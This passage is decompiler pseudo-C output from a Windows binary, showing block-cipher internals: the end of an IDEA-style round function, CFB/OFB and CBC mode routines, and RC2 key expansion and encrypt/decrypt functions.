    v14 = (unsigned __int16)v13 - HIWORD(v13) - ((unsigned int)((unsigned __int16)v13 - HIWORD(v13)) >> 16);
  else
    v14 = 1 - a2[4] - v12;
  v15 = (unsigned __int16)(v14 + (v5 ^ v11));
  v16 = v15 * a2[5];
  if ( v16 )
  {
    v17 = (unsigned __int16)v16 - HIWORD(v16);
    v15 = HIWORD(v17);
  }
  else
  {
    v17 = 1 - a2[5];
  }
  v18 = v17 - v15;
  v19 = v18 + v14;
  v20 = v19 ^ v11;
  v21 = v5 ^ v19;
  v22 = v8 ^ v18;
  v23 = (unsigned __int16)(v7 ^ v18);
  v24 = a2[6];
  if ( v23 * v24 )
  {
    v25 = (unsigned __int16)(v23 * v24) - ((v23 * v24) >> 16);
    v23 = HIWORD(v25);
  }
  else
  {
    LOWORD(v25) = 1 - v24;
  }
  v26 = v25 - v23;
  v27 = a2[7] + v22;
  v28 = a2[8] + v21;
  LOWORD(v23) = v20;
  v29 = v20 * a2[9];
  if ( v29 )
  {
    v30 = (unsigned __int16)v29 - HIWORD(v29);
    v23 = HIWORD(v30);
  }
  else
  {
    v30 = 1 - a2[9];
  }
  v31 = v30 - v23;
  v32 = (unsigned __int16)(v26 ^ v28);
  v33 = v32 * a2[10];
  if ( v33 )
  {
    v34 = (unsigned __int16)v33 - HIWORD(v33);
    v32 = HIWORD(v34);
  }
  else
  {
    v34 = 1 - a2[10];
  }
  v35 = v34 - v32;
  v36 = (unsigned __int16)(v35 + (v27 ^ v31));
  v37 = v36 * a2[11];
  if ( v37 )
  {
    v38 = (unsigned __int16)v37 - HIWORD(v37);
    v36 = HIWORD(v38);
  }
  else
  {
    v38 = 1 - a2[11];
  }
  v39 = v38 - v36;
  v40 = v39 + v35;
  v41 = v40 ^ v31;
  v42 = v27 ^ v40;
  v43 = v28 ^ v39;
  v44 = (unsigned __int16)(v26 ^ v39);
  v45 = a2[12];
  if ( v44 * v45 )
  {
    v46 = (unsigned __int16)(v44 * v45) - ((v44 * v45) >> 16);
    v44 = HIWORD(v46);
  }
  else
  {
    LOWORD(v46) = 1 - v45;
  }
  v47 = v46 - v44;
  v48 = a2[13] + v43;
  v49 = a2[14] + v42;
  LOWORD(v44) = v41;
  v50 = v41 * a2[15];
  if ( v50 )
  {
    v51 = (unsigned __int16)v50 - HIWORD(v50);
    v44 = HIWORD(v51);
  }
  else
  {
    v51 = 1 - a2[15];
  }
  v52 = v51 - v44;
  v53 = (unsigned __int16)(v47 ^ v49);
  v54 = v53 * a2[16];
  if ( v54 )
  {
    v55 = (unsigned __int16)v54 - HIWORD(v54);
    v53 = HIWORD(v55);
  }
  else
  {
    v55 = 1 - a2[16];
  }
  v56 = v55 - v53;
  v57 = (unsigned __int16)(v56 + (v48 ^ v52));
  v58 = v57 * a2[17];
  if ( v58 )
  {
    v59 = (unsigned __int16)v58 - HIWORD(v58);
    v57 = HIWORD(v59);
  }
  else
  {
    v59 = 1 - a2[17];
  }
  v60 = v59 - v57;
  v61 = v60 + v56;
  v62 = v61 ^ v52;
  v63 = v48 ^ v61;
  v64 = v49 ^ v60;
  v65 = (unsigned __int16)(v47 ^ v60);
  v66 = a2[18];
  if ( v65 * v66 )
  {
    v67 = (unsigned __int16)(v65 * v66) - ((v65 * v66) >> 16);
    v65 = HIWORD(v67);
  }
  else
  {
    LOWORD(v67) = 1 - v66;
  }
  v68 = v67 - v65;
  v69 = a2[19] + v64;
  v70 = a2[20] + v63;
  LOWORD(v65) = v62;
  v71 = v62 * a2[21];
  if ( v71 )
  {
    v72 = (unsigned __int16)v71 - HIWORD(v71);
    v65 = HIWORD(v72);
  }
  else
  {
    v72 = 1 - a2[21];
  }
  v73 = v72 - v65;
  v74 = (unsigned __int16)(v68 ^ v70);
  v75 = v74 * a2[22];
  if ( v75 )
  {
    v76 = (unsigned __int16)v75 - HIWORD(v75);
    v74 = HIWORD(v76);
  }
  else
  {
    v76 = 1 - a2[22];
  }
  v77 = v76 - v74;
  v78 = (unsigned __int16)(v77 + (v69 ^ v73));
  v79 = v78 * a2[23];
  if ( v79 )
  {
    v80 = (unsigned __int16)v79 - HIWORD(v79);
    v78 = HIWORD(v80);
  }
  else
  {
    v80 = 1 - a2[23];
  }
  v81 = v80 - v78;
  v82 = v81 + v77;
  v83 = v82 ^ v73;
  v84 = v69 ^ v82;
  v85 = v70 ^ v81;
  v86 = (unsigned __int16)(v68 ^ v81);
  v87 = a2[24];
  if ( v86 * v87 )
  {
    v88 = (unsigned __int16)(v86 * v87) - ((v86 * v87) >> 16);
    v86 = HIWORD(v88);
  }
  else
  {
    LOWORD(v88) = 1 - v87;
  }
  v89 = v88 - v86;
  v90 = a2[25] + v85;
  v91 = a2[26] + v84;
  LOWORD(v86) = v83;
  v92 = v83 * a2[27];
  if ( v92 )
  {
    v93 = (unsigned __int16)v92 - HIWORD(v92);
    v86 = HIWORD(v93);
  }
  else
  {
    v93 = 1 - a2[27];
  }
  v94 = v93 - v86;
  v95 = (unsigned __int16)(v89 ^ v91);
  v96 = v95 * a2[28];
  if ( v96 )
  {
    v97 = (unsigned __int16)v96 - HIWORD(v96);
    v95 = HIWORD(v97);
  }
  else
  {
    v97 = 1 - a2[28];
  }
  v98 = v97 - v95;
  v99 = (unsigned __int16)(v98 + (v90 ^ v94));
  v100 = v99 * a2[29];
  if ( v100 )
  {
    v101 = (unsigned __int16)v100 - HIWORD(v100);
    v99 = HIWORD(v101);
  }
  else
  {
    v101 = 1 - a2[29];
  }
  v102 = v101 - v99;
  v103 = v102 + v98;
  v104 = v103 ^ v94;
  v105 = v90 ^ v103;
  v106 = v91 ^ v102;
  v107 = (unsigned __int16)(v89 ^ v102);
  v108 = a2[30];
  if ( v107 * v108 )
  {
    v109 = (unsigned __int16)(v107 * v108) - ((v107 * v108) >> 16);
    v107 = HIWORD(v109);
  }
  else
  {
    LOWORD(v109) = 1 - v108;
  }
  v110 = v109 - v107;
  v111 = a2[31] + v106;
  v112 = a2[32] + v105;
  LOWORD(v107) = v104;
  v113 = v104 * a2[33];
  if ( v113 )
  {
    v114 = (unsigned __int16)v113 - HIWORD(v113);
    v107 = HIWORD(v114);
  }
  else
  {
    v114 = 1 - a2[33];
  }
  v115 = v114 - v107;
  v116 = (unsigned __int16)(v110 ^ v112);
  v117 = v116 * a2[34];
  if ( v117 )
  {
    v118 = (unsigned __int16)v117 - HIWORD(v117);
    v116 = HIWORD(v118);
  }
  else
  {
    v118 = 1 - a2[34];
  }
  v119 = v118 - v116;
  v120 = (unsigned __int16)(v119 + (v111 ^ v115));
  v121 = v120 * a2[35];
  if ( v121 )
  {
    v122 = (unsigned __int16)v121 - HIWORD(v121);
    v120 = HIWORD(v122);
  }
  else
  {
    v122 = 1 - a2[35];
  }
  v123 = v122 - v120;
  v124 = v123 + v119;
  v125 = v124 ^ v115;
  v126 = v111 ^ v124;
  v127 = v112 ^ v123;
  v128 = (unsigned __int16)(v110 ^ v123);
  v129 = a2[36];
  if ( v128 * v129 )
  {
    v130 = (unsigned __int16)(v128 * v129) - ((v128 * v129) >> 16);
    v128 = HIWORD(v130);
  }
  else
  {
    LOWORD(v130) = 1 - v129;
  }
  v131 = v130 - v128;
  v132 = a2[37] + v127;
  v133 = a2[38] + v126;
  LOWORD(v128) = v125;
  v134 = v125 * a2[39];
  if ( v134 )
  {
    v135 = (unsigned __int16)v134 - HIWORD(v134);
    v128 = HIWORD(v135);
  }
  else
  {
    v135 = 1 - a2[39];
  }
  v136 = v135 - v128;
  v137 = (unsigned __int16)(v131 ^ v133);
  v138 = v137 * a2[40];
  if ( v138 )
  {
    v139 = (unsigned __int16)v138 - HIWORD(v138);
    v137 = HIWORD(v139);
  }
  else
  {
    v139 = 1 - a2[40];
  }
  v140 = v139 - v137;
  v141 = (unsigned __int16)(v140 + (v132 ^ v136));
  v142 = v141 * a2[41];
  if ( v142 )
  {
    v143 = (unsigned __int16)v142 - HIWORD(v142);
    v141 = HIWORD(v143);
  }
  else
  {
    v143 = 1 - a2[41];
  }
  v144 = v143 - v141;
  v145 = v144 + v140;
  v146 = v145 ^ v136;
  v147 = v132 ^ v145;
  v148 = v133 ^ v144;
  v149 = (unsigned __int16)(v131 ^ v144);
  v150 = v149 * a2[42];
  if ( v150 )
  {
    v151 = (unsigned __int16)v150 - HIWORD(v150);
    v149 = HIWORD(v151);
  }
  else
  {
    v151 = 1 - a2[42];
  }
  v152 = v151 - v149;
  v153 = a2[43] + v148;
  v154 = a2[44] + v147;
  LOWORD(v149) = v146;
  v155 = v146 * a2[45];
  if ( v155 )
  {
    v156 = (unsigned __int16)v155 - HIWORD(v155);
    v149 = HIWORD(v156);
  }
  else
  {
    v156 = 1 - a2[45];
  }
  v157 = v156 - v149;
  v158 = (unsigned __int16)(v152 ^ v154);
  v159 = v158 * a2[46];
  if ( v159 )
  {
    v160 = (unsigned __int16)v159 - HIWORD(v159);
    v158 = HIWORD(v160);
  }
  else
  {
    v160 = 1 - a2[46];
  }
  v161 = v160 - v158;
  v162 = (unsigned __int16)(v161 + (v153 ^ v157));
  v163 = v162 * a2[47];
  if ( v163 )
  {
    v164 = (unsigned __int16)v163 - HIWORD(v163);
    v162 = HIWORD(v164);
  }
  else
  {
    v164 = 1 - a2[47];
  }
  v165 = v164 - v162;
  v166 = v165 + v161;
  v167 = v166 ^ v157;
  v168 = v153 ^ v166;
  v169 = v154 ^ v165;
  v170 = (unsigned __int16)(v152 ^ v165);
  v171 = v170 * a2[48];
  if ( v171 )
  {
    v172 = (unsigned __int16)v171 - HIWORD(v171);
    v170 = HIWORD(v172);
  }
  else
  {
    v172 = 1 - a2[48];
  }
  v173 = v172 - v170;
  v174 = v168 + a2[49];
  v175 = v167;
  v176 = a2[51];
  v177 = v169 + a2[50];
  if ( v175 * v176 )
  {
    v178 = (unsigned __int16)(v175 * v176) - ((v175 * v176) >> 16);
    v175 = HIWORD(v178);
  }
  else
  {
    LOWORD(v178) = 1 - v176;
  }
  *a1 = (v173 << 16) | (unsigned __int16)v174;
  result = (unsigned __int16)(v178 - v175);
  a1[1] = result | (v177 << 16);
  return result;
}

//----- (000000014008A290) ----------------------------------------------------
unsigned __int8 __fastcall sub_14008A290(
        unsigned __int8 *a1,
        unsigned __int8 *a2,
        int a3,
        _DWORD *a4,
        unsigned __int8 *a5,
        int *a6,
        int a7)
{
  int *v8; // r12
  int v9; // esi
  unsigned __int8 *v10; // r14
  unsigned __int8 *v11; // r15
  int v12; // ebx
  unsigned __int8 *v13; // rbp
  __int64 v14; // r15
  int v15; // edx
  int v16; // eax
  int v17; // ecx
  unsigned __int8 v18; // al
  int v19; // ecx
  unsigned __int8 v20; // al
  unsigned __int8 result; // al
  unsigned __int8 *v22; // rbp
  int v23; // edx
  int v24; // eax
  int v25; // ecx
  unsigned __int8 v26; // al
  int v27; // ecx
  unsigned __int8 v28; // al
  unsigned __int8 v29; // dl
  unsigned __int8 v30; // cl

  v8 = a6;
  v9 = a3;
  v10 = a2;
  v11 = a1;
  v12 = *a6;
  if ( a7 )
  {
    if ( a3 )
    {
      v13 = a5;
      v14 = a1 - a2;
      do
      {
        --v9;
        if ( !v12 )
        {
          v15 = v13[4] << 24;
          v16 = v13[5];
          LODWORD(a5) = v13[3] | (v13[2] << 8) | ((v13[1] | (*v13 << 8)) << 16);
          HIDWORD(a5) = (v16 << 16) | v15 | v13[7] | (v13[6] << 8);
          sub_140089A90((int *)&a5, a4);
          v17 = (int)a5;
          *v13 = BYTE3(a5);
          v13[1] = BYTE2(v17);
          v18 = (unsigned __int8)a5;
          v13[2] = BYTE1(v17);
          v19 = HIDWORD(a5);
          v13[3] = v18;
          v13[4] = HIBYTE(v19);
          v13[5] = BYTE2(v19);
          v20 = BYTE4(a5);
          v13[6] = BYTE1(v19);
          v13[7] = v20;
        }
        result = v13[v12] ^ v10[v14];
        *v10++ = result;
        v13[v12] = result;
        v12 = ((_BYTE)v12 + 1) & 7;
      }
      while ( v9 );
    }
  }
  else if ( a3 )
  {
    v22 = a5;
    do
    {
      --v9;
      if ( !v12 )
      {
        v23 = v22[4] << 24;
        v24 = v22[5];
        LODWORD(a5) = v22[3] | (v22[2] << 8) | ((v22[1] | (*v22 << 8)) << 16);
        HIDWORD(a5) = (v24 << 16) | v23 | v22[7] | (v22[6] << 8);
        sub_140089A90((int *)&a5, a4);
        v25 = (int)a5;
        *v22 = BYTE3(a5);
        v22[1] = BYTE2(v25);
        v26 = (unsigned __int8)a5;
        v22[2] = BYTE1(v25);
        v27 = HIDWORD(a5);
        v22[3] = v26;
        v22[4] = HIBYTE(v27);
        v22[5] = BYTE2(v27);
        v28 = BYTE4(a5);
        v22[6] = BYTE1(v27);
        v22[7] = v28;
      }
      v29 = *v11++;
      result = v12;
      v30 = v22[v12];
      v22[v12] = v29;
      *v10++ = v30 ^ v29;
      v12 = ((_BYTE)v12 + 1) & 7;
    }
    while ( v9 );
  }
  *v8 = v12;
  return result;
}

//----- (000000014008A4B0) ----------------------------------------------------
__int64 __fastcall sub_14008A4B0(_BYTE *a1, __int64 a2, int a3, __int64 a4, unsigned __int8 *a5, int *a6)
{
  int v7; // r8d
  int *v8; // r13
  int v10; // ecx
  int v11; // r10d
  int v12; // r15d
  int v13; // ebx
  int v14; // r10d
  int v15; // r8d
  int v16; // ecx
  unsigned int v17; // r8d
  __int64 result; // rax
  _DWORD *v19; // r13
  __int64 v20; // r12
  unsigned __int8 v21; // dl
  unsigned __int8 v22; // r9
  int v23; // [rsp+20h] [rbp-40h] BYREF
  unsigned int v24; // [rsp+24h] [rbp-3Ch]
  _DWORD *v25; // [rsp+28h] [rbp-38h]
  int *v26; // [rsp+30h] [rbp-30h]
  unsigned __int8 *v27; // [rsp+38h] [rbp-28h]
  char v28; // [rsp+40h] [rbp-20h]
  char v29; // [rsp+41h] [rbp-1Fh]
  char v30; // [rsp+42h] [rbp-1Eh]
  char v31; // [rsp+43h] [rbp-1Dh]
  char v32; // [rsp+44h] [rbp-1Ch]
  char v33; // [rsp+45h] [rbp-1Bh]
  char v34; // [rsp+46h] [rbp-1Ah]
  char v35; // [rsp+47h] [rbp-19h]

  v7 = a5[4];
  v8 = a6;
  v10 = a5[6];
  v11 = *a5;
  v27 = a5;
  v12 = 0;
  v13 = *a6;
  v14 = a5[3] | (a5[2] << 8) | (a5[1] << 16) | (v11 << 24);
  v25 = (_DWORD *)a4;
  v15 = (a5[5] << 16) | (v7 << 24);
  v26 = a6;
  v16 = a5[7] | (v10 << 8);
  v23 = v14;
  v17 = v16 | v15;
  v31 = v14;
  v24 = v17;
  v28 = HIBYTE(v14);
  v29 = BYTE2(v14);
  v30 = BYTE1(v14);
  v32 = HIBYTE(v17);
  v33 = BYTE2(v17);
  result = v17 >> 8;
  v34 = BYTE1(v17);
  v35 = v17;
  if ( a3 )
  {
    v19 = v25;
    v20 = a2 - (_QWORD)a1;
    v21 = v17;
    v22 = v14;
    do
    {
      --a3;
      if ( !v13 )
      {
        sub_140089A90(&v23, v19);
        v14 = v23;
        v17 = v24;
        v22 = v23;
        v21 = v24;
        v28 = HIBYTE(v23);
        v29 = BYTE2(v23);
        v30 = BYTE1(v23);
        v32 = HIBYTE(v24);
        v33 = BYTE2(v24);
        v34 = BYTE1(v24);
        ++v12;
        v31 = v23;
        v35 = v24;
      }
      result = v13;
      a1[v20] = *a1 ^ *(&v28 + v13);
      ++a1;
      v13 = ((_BYTE)v13 + 1) & 7;
    }
    while ( a3 );
    v8 = v26;
    if ( v12 )
    {
      *v27 = HIBYTE(v14);
      a5[1] = BYTE2(v14);
      a5[2] = BYTE1(v14);
      a5[3] = v22;
      a5[4] = HIBYTE(v17);
      result = HIWORD(v17);
      a5[5] = BYTE2(v17);
      a5[6] = BYTE1(v17);
      a5[7] = v21;
    }
  }
  *v8 = v13;
  return result;
}

//----- (000000014008A6A0) ----------------------------------------------------
unsigned __int8 *__fastcall sub_14008A6A0(_BYTE *a1, int a2, __int64 a3, int a4)
{
  int v4; // edi
  int v5; // r11d
  _BYTE *v6; // r10
  __int64 v7; // r8
  __int64 v8; // rdx
  unsigned __int8 v9; // r8
  _BYTE *v10; // rdx
  __int64 v11; // r9
  char v12; // al
  int v13; // r9d
  __int64 v14; // r8
  _BYTE *v15; // rdx
  __int64 v16; // rax
  __int64 v17; // rcx
  _BYTE *v18; // r8
  __int64 v19; // r9
  unsigned __int8 *result; // rax
  int v21; // edx
  int v22; // ecx

  *a1 = 0;
  v4 = 1024;
  v5 = 128;
  v6 = a1;
  if ( a2 <= 128 )
    v5 = a2;
  if ( a4 > 0 )
    v4 = a4;
  if ( v4 > 1024 )
    v4 = 1024;
  if ( v5 > 0 )
  {
    v7 = a3 - (_QWORD)a1;
    v8 = v5;
    do
    {
      *a1 = a1[v7];
      ++a1;
      --v8;
    }
    while ( v8 );
  }
  v9 = v6[v5 - 1];
  if ( v5 < 128i64 )
  {
    v10 = &v6[v5];
    v11 = 128i64 - v5;
    do
    {
      v12 = v10[-v5];
      ++v10;
      v9 = byte_140112FC0[(unsigned __int8)(v9 + v12)];
      *(v10 - 1) = v9;
      --v11;
    }
    while ( v11 );
  }
  v13 = (v4 + 7) >> 3;
  v14 = 128 - v13;
  v15 = &v6[v14];
  v16 = byte_140112FC0[(unsigned __int8)v6[v14] & (unsigned __int64)(255 >> (-(char)v4 & 7))];
  v6[v14] = v16;
  if ( 128 != v13 )
  {
    do
    {
      v17 = (unsigned __int8)v15[v13 - 1];
      --v15;
      LOBYTE(v16) = byte_140112FC0[v16 ^ v17];
      *v15 = v16;
      --v14;
    }
    while ( v14 );
  }
  v18 = v6 + 252;
  v19 = 64i64;
  result = v6 + 126;
  do
  {
    v21 = result[1];
    v18 -= 4;
    v22 = *result;
    result -= 2;
    *((_DWORD *)v18 + 1) = v22 | (v21 << 8);
    --v19;
  }
  while ( v19 );
  return result;
}
// 140112FC0: using guessed type unsigned __int8 byte_140112FC0[256];

//----- (000000014008A800) ----------------------------------------------------
__int64 __fastcall sub_14008A800(unsigned __int8 *a1, __int64 a2, __int64 a3, int a4)
{
  int v6; // edx
  int v7; // r10d
  int v8; // eax
  int v9; // ecx
  __int16 v10; // ecx^2
  char v11; // al
  unsigned int v12; // ecx
  __int64 result; // rax
  int v14; // [rsp+30h] [rbp+8h] BYREF
  int v15; // [rsp+34h] [rbp+Ch]

  v6 = a1[4];
  v7 = (a1[3] << 24) | (a1[2] << 16) | *(unsigned __int16 *)a1;
  v8 = a1[5];
  v9 = a1[7] << 8;
  v14 = v7;
  v15 = (v8 << 8) | v6 | ((a1[6] | v9) << 16);
  if ( a4 )
    sub_14008AF80(&v14, a3);
  else
    sub_14008AE30(&v14, a3);
  v10 = HIWORD(v14);
  *(_WORD *)a2 = v14;
  *(_BYTE *)(a2 + 2) = v10;
  v11 = v15;
  *(_BYTE *)(a2 + 3) = HIBYTE(v10);
  v12 = v15;
  *(_BYTE *)(a2 + 4) = v11;
  *(_BYTE *)(a2 + 5) = BYTE1(v12);
  result = HIWORD(v12);
  *(_BYTE *)(a2 + 6) = BYTE2(v12);
  *(_BYTE *)(a2 + 7) = HIBYTE(v12);
  return result;
}

//----- (000000014008A8D0) ----------------------------------------------------
__int64 __fastcall sub_14008A8D0(unsigned __int16 *a1, __int64 a2, unsigned int a3, __int64 a4, int *a5, int a6)
{
  int *v9; // rdi
  unsigned int v10; // esi
  int v11; // r10d
  unsigned int v12; // r8d
  unsigned __int64 v13; // r15
  int v14; // ecx
  int v15; // ecx
  int v16; // eax
  char *v17; // r14
  int v18; // ecx
  int v19; // edx
  int v20; // ecx
  int v21; // eax
  int v22; // eax
  int v23; // eax
  int v24; // edx
  int v25; // eax
  int v26; // eax
  int *v28; // r15
  int v29; // edi
  int v30; // r12d
  unsigned int v31; // r13d
  unsigned __int64 v32; // r15
  int v33; // esi
  int v34; // edi
  int v35; // edi
  int v36; // eax
  int v37; // edi
  int v38; // ecx
  int v39; // edx
  int v40; // ecx
  int v41; // esi
  int v42; // edx
  int v43; // edx
  int v44; // r8d
  __int64 v45; // rbx
  int v46; // [rsp+20h] [rbp-10h] BYREF
  unsigned int v47; // [rsp+24h] [rbp-Ch]
  int *v48; // [rsp+28h] [rbp-8h]
  __int64 v49; // [rsp+78h] [rbp+48h]
  int v50; // [rsp+88h] [rbp+58h]
  int v51; // [rsp+88h] [rbp+58h]

  v49 = a4;
  if ( a6 )
  {
    v9 = a5;
    v10 = a3 - 8;
    v48 = a5;
    v11 = (*((unsigned __int8 *)a5 + 3) << 24) | (*((unsigned __int8 *)a5 + 2) << 16) | *(unsigned __int16 *)a5;
    v12 = (*((unsigned __int8 *)a5 + 7) << 24) | (*((unsigned __int8 *)a5 + 6) << 16) | *((unsigned __int16 *)a5 + 2);
    if ( (int)(a3 - 8) >= 0 )
    {
      v13 = (unsigned __int64)(v10 + 8) >> 3;
      v10 -= 8 * ((v10 + 8) >> 3);
      do
      {
        v14 = a1[2];
        v46 = v11 ^ ((*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1);
        v15 = (*((unsigned __int8 *)a1 + 6) << 16) | v14;
        v16 = *((unsigned __int8 *)a1 + 7) << 24;
        a1 += 4;
        v47 = v12 ^ (v16 | v15);
        sub_14008AF80(&v46, v49);
        v11 = v46;
        v12 = v47;
        *(_WORD *)a2 = v46;
        *(_BYTE *)(a2 + 2) = BYTE2(v11);
        *(_BYTE *)(a2 + 3) = HIBYTE(v11);
        *(_DWORD *)(a2 + 4) = v12;
        a2 += 8i64;
        --v13;
      }
      while ( v13 );
      v9 = v48;
    }
    if ( v10 != -8 )
    {
      v17 = (char *)a1 + (int)(v10 + 8);
      v18 = 0;
      v19 = 0;
      switch ( v10 )
      {
        case 0xFFFFFFF9:
          goto LABEL_15;
        case 0xFFFFFFFA:
          goto LABEL_14;
        case 0xFFFFFFFB:
          goto LABEL_13;
        case 0xFFFFFFFC:
          goto LABEL_12;
        case 0xFFFFFFFD:
          goto LABEL_11;
        case 0xFFFFFFFE:
          goto LABEL_10;
        case 0xFFFFFFFF:
          goto LABEL_9;
        case 0u:
          v20 = (unsigned __int8)*--v17;
          v18 = v20 << 24;
LABEL_9:
          v21 = (unsigned __int8)*--v17;
          v18 |= v21 << 16;
LABEL_10:
          v22 = (unsigned __int8)*--v17;
          v18 |= v22 << 8;
LABEL_11:
          v23 = (unsigned __int8)*--v17;
          v18 |= v23;
LABEL_12:
          v24 = (unsigned __int8)*--v17;
          v19 = v24 << 24;
LABEL_13:
          v25 = (unsigned __int8)*--v17;
          v19 |= v25 << 16;
LABEL_14:
          v26 = (unsigned __int8)*--v17;
          v19 |= v26 << 8;
LABEL_15:
          v19 |= (unsigned __int8)*(v17 - 1);
          break;
        default:
          break;
      }
      v46 = v11 ^ v19;
      v47 = v12 ^ v18;
      sub_14008AF80(&v46, v49);
      v11 = v46;
      v12 = v47;
      *(_WORD *)a2 = v46;
      *(_BYTE *)(a2 + 2) = BYTE2(v11);
      *(_BYTE *)(a2 + 3) = HIBYTE(v11);
      *(_DWORD *)(a2 + 4) = v12;
    }
    *v9 = v11;
    v9[1] = v12;
    return HIWORD(v12);
  }
  else
  {
    v28 = a5;
    v29 = a3 - 8;
    v48 = a5;
    v30 = (*((unsigned __int8 *)a5 + 3) << 24) | (*((unsigned __int8 *)a5 + 2) << 16) | *(unsigned __int16 *)a5;
    v31 = (*((unsigned __int8 *)a5 + 7) << 24) | (*((unsigned __int8 *)a5 + 6) << 16) | *((unsigned __int16 *)a5 + 2);
    if ( (int)(a3 - 8) >= 0 )
    {
      v32 = (unsigned __int64)a3 >> 3;
      v50 = a3 - 8 - 8 * (a3 >> 3);
      do
      {
        v34 = a1[2];
        v46 = (*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1;
        v33 = v46;
        v35 = (*((unsigned __int8 *)a1 + 6) << 16) | v34;
        v36 = *((unsigned __int8 *)a1 + 7) << 24;
        a1 += 4;
        v37 = v36 | v35;
        v47 = v37;
        sub_14008AE30(&v46, a4);
        v38 = v30 ^ v46;
        a4 = v49;
        v39 = v31 ^ v47;
        *(_BYTE *)a2 = v30 ^ v46;
        v30 = v33;
        *(_BYTE *)(a2 + 1) = BYTE1(v38);
        v31 = v37;
        *(_BYTE *)(a2 + 2) = BYTE2(v38);
        *(_BYTE *)(a2 + 3) = HIBYTE(v38);
        *(_DWORD *)(a2 + 4) = v39;
        a2 += 8i64;
        --v32;
      }
      while ( v32 );
      v28 = v48;
      v29 = v50;
    }
    if ( v29 != -8 )
    {
      v40 = *((unsigned __int8 *)a1 + 7) << 8;
      v41 = (*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1;
      v42 = a1[2];
      v46 = v41;
      v51 = ((*((unsigned __int8 *)a1 + 6) | v40) << 16) | v42;
      v47 = v51;
      sub_14008AE30(&v46, a4);
      v43 = v30 ^ v46;
      v44 = v31 ^ v47;
      v45 = v29 + 8 + a2;
      switch ( v29 )
      {
        case -7:
          goto LABEL_31;
        case -6:
          goto LABEL_30;
        case -5:
          goto LABEL_29;
        case -4:
          goto LABEL_28;
        case -3:
          goto LABEL_27;
        case -2:
          goto LABEL_26;
        case -1:
          goto LABEL_25;
        case 0:
          *(_BYTE *)--v45 = HIBYTE(v44);
LABEL_25:
          *(_BYTE *)--v45 = BYTE2(v44);
LABEL_26:
          *(_BYTE *)--v45 = BYTE1(v44);
LABEL_27:
          *(_BYTE *)--v45 = v44;
LABEL_28:
          *(_BYTE *)--v45 = HIBYTE(v43);
LABEL_29:
          *(_BYTE *)--v45 = BYTE2(v43);
LABEL_30:
          *(_BYTE *)--v45 = BYTE1(v43);
LABEL_31:
          *(_BYTE *)(v45 - 1) = v43;
          break;
        default:
          break;
      }
      v31 = v51;
      v30 = v41;
    }
    *v28 = v30;
    v28[1] = v31;
    return HIWORD(v31);
  }
}

//----- (000000014008AE30) ----------------------------------------------------
__int64 __fastcall sub_14008AE30(int *a1, __int64 a2)
{
  _WORD *v2; // rsi
  unsigned int v3; // eax
  int v4; // edi
  unsigned int v5; // r9d
  unsigned int v6; // r8d
  unsigned int v7; // r10d
  int v8; // r11d
  unsigned int i; // eax
  __int64 result; // rax

  v2 = (_WORD *)(a2 + 252);
  v3 = a1[1];
  v4 = 3;
  v5 = (unsigned __int16)*a1;
  v6 = HIWORD(*a1);
  v7 = (unsigned __int16)v3;
  v8 = 5;
  for ( i = HIWORD(v3); ; v5 = (unsigned __int16)(v5 - *(_WORD *)(a2 + 4i64 * (i & 0x3F))) )
  {
    do
    {
      v2 -= 8;
      i = (unsigned __int16)(((i >> 5) | ((_WORD)i << 11)) - (v5 & ~(_WORD)v7) - (v6 & v7) - v2[8]);
      v7 = (unsigned __int16)(((v7 >> 3) | ((_WORD)v7 << 13)) - (i & ~(_WORD)v6) - (v5 & v6) - v2[6]);
      v6 = (unsigned __int16)(((v6 >> 2) | ((_WORD)v6 << 14)) - (v7 & ~(_WORD)v5) - (v5 & i) - v2[4]);
      v5 = (unsigned __int16)(((v5 >> 1) | ((_WORD)v5 << 15)) - (v6 & ~(_WORD)i) - (v7 & i) - v2[2]);
      --v8;
    }
    while ( v8 );
    if ( !--v4 )
      break;
    LOBYTE(v8) = v4 == 2;
    v8 += 5;
    i = (unsigned __int16)(i - *(_WORD *)(a2 + 4i64 * (v7 & 0x3F)));
    v7 = (unsigned __int16)(v7 - *(_WORD *)(a2 + 4i64 * (v6 & 0x3F)));
    v6 = (unsigned __int16)(v6 - *(_WORD *)(a2 + 4i64 * (v5 & 0x3F)));
  }
  result = v7 | (i << 16);
  *a1 = v5 | (v6 << 16);
  a1[1] = result;
  return result;
}

//----- (000000014008AF80) ----------------------------------------------------
__int64 __fastcall sub_14008AF80(int *a1, __int64 a2)
{
  int v2; // edi
  int v3; // r11d
  unsigned int v4; // r8d
  __int64 v5; // rsi
  int v6; // ebx
  int v7; // r9d
  unsigned int i; // eax
  unsigned int v9; // r11d
  unsigned int v10; // eax
  __int64 result; // rax

  v2 = 3;
  LOWORD(v3) = *a1;
  v4 = HIWORD(*a1);
  v5 = a2;
  LOWORD(v6) = a1[1];
  v7 = 5;
  for ( i = HIWORD(a1[1]); ; i += *(_DWORD *)(a2 + 4i64 * (v6 & 0x3F)) )
  {
    do
    {
      v5 += 16i64;
      v9 = (unsigned __int16)(v3 + *(_WORD *)(v5 - 16) + (v6 & i) + (v4 & ~(_WORD)i));
      v3 = (2 * v9) | (v9 >> 15);
      v4 = (4 * (unsigned __int16)(v4 + *(_WORD *)(v5 - 12) + (v3 & i) + (v6 & ~(_WORD)v3))) | ((unsigned __int16)(v4 + *(_WORD *)(v5 - 12) + (v3 & i) + (v6 & ~(_WORD)v3)) >> 14);
      v6 = (8 * (unsigned __int16)(v6 + *(_WORD *)(v5 - 8) + (v3 & v4) + (i & ~(_WORD)v4))) | ((unsigned __int16)(v6 + *(_WORD *)(v5 - 8) + (v3 & v4) + (i & ~(_WORD)v4)) >> 13);
      v10 = (unsigned __int16)(i + *(_WORD *)(v5 - 4) + (v4 & v6) + (v3 & ~(_WORD)v6));
      i = (32 * v10) | (v10 >> 11);
      --v7;
    }
    while ( v7 );
    if ( !--v2 )
      break;
    LOBYTE(v7) = v2 == 2;
    v7 += 5;
    v3 += *(_DWORD *)(a2 + 4i64 * (i & 0x3F));
    v4 += *(_DWORD *)(a2 + 4i64 * (v3 & 0x3F));
    v6 += *(_DWORD *)(a2 + 4i64 * (v4 & 0x3F));
  }
  result = (unsigned __int16)v6 | (i << 16);
  a1[1] = result;
  *a1 = (unsigned __int16)v3 | (v4 << 16);
  return result;
}

//----- (000000014008B0D0) ----------------------------------------------------
